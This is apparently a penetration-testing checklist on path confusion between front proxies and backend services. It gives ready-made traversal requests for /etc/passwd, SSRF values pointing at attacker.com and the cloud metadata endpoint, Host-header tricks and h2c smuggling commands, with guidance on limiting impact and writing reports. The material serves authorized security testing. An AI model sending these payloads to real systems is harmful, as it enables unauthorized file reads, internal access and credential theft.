# Secondary Context / Path Confusion

**What it is:** A front proxy/gateway (nginx, Apache, API gateway, WebLogic, Lambda@Edge) routes on the path you send, then forwards a **rebuilt** URL to an internal service. If the two layers normalize `../`, `..;`, encoded slashes, or `@` differently, you reach internal endpoints the gateway thought it blocked — LFI, SSRF, internal-API access, auth bypass. Same root cause as request smuggling, but on the path/routing layer.

## Where to look
- Reverse-proxied paths (`/api/...`, `/service/...`) that map to a backend; API gateways rewriting `/{stage}/{proxy+}`; any "download/render/proxy this path" handler; a backend param that becomes a path or rewrite rule.

## Path traversal across the proxy
```
GET /Endpoint/#/../../../../etc/passwd            # fragment eaten by gateway, sent to backend
GET /Endpoint/..;/../../etc/passwd                # ;-segment (Tomcat/WebLogic)
GET /Endpoint/..//../../etc/passwd                # Apache reverse-proxy
GET /Endpoint/../../../etc/passwd//../            # nginx+Apache normalization gap
GET /Endpoint/.git%3FAllowed                      # encoded ? tricks the allow-check
```
- [ ] Encoded delimiters to desync the two parsers: `..%2f`, `%2e%2e%2f`, `..%00/`, `..%0d/`, double-encoded `%252e%252e%252f`.
- [ ] Map how many segments escape the gateway prefix vs. reach the backend root.

## Reaching internal endpoints / SSRF
- [ ] Backend param interpreted as a URL or path:
```json
{"path":"../../../../etc/passwd"}
{"url":";@attacker.com"}
{"url":"http://169.254.169.254/latest/meta-data/"}
```
- [ ] Host / routing confusion → SSRF to internal or attacker:
```
Host: company.com@attacker.com
GET @attacker.com/path HTTP/1.1
GET /path@attacker.com# HTTP/1.1
X-Forwarded-Host: attacker.com
```
- [ ] Walk from a public API method to an admin/internal sibling on the backend that the gateway never exposed.

## Protocol / header desync adjacency
- [ ] **h2c smuggling:** `h2csmuggler.py --scan-list urls.txt` — upgrade to cleartext HTTP/2 through a proxy that only guards HTTP/1, then send arbitrary internal requests.
- [ ] **WebSocket smuggling:** upgrade, then tunnel a second request to an internal endpoint over the socket.
- [ ] **Hop-by-hop / connection abuse:** `Connection: close, Cookie` (strip a header before the backend), `Max-Forwards: 0`, oversized headers to change routing.

## Impact
Internal file read (LFI), SSRF → cloud metadata / internal admin APIs, auth/authorization bypass, and RCE when it lands on an unauthenticated internal service.

## Test discipline
Confirm the request actually reached the **backend** (different error signature, internal header echoed, timing) versus being served/blocked at the edge. One benign internal read or a Collaborator hit proves it — don't pivot into destructive internal actions.

## Report notes
Show the exact path/headers sent, the normalized request the backend received (or the leaked internal response), and that the edge intended to block it. Name the two layers and the parser gap. Distinguish from plain SSRF (this is routing/normalization desync).

## Related
`03-injection/06-ssrf.md` · `03-injection/09-lfi-path-traversal.md` · `08-infra/02-request-smuggling.md` · `10-server-edge/02-load-balancer-proxy-desync.md` · `09-advanced/09-host-header-injection.md`
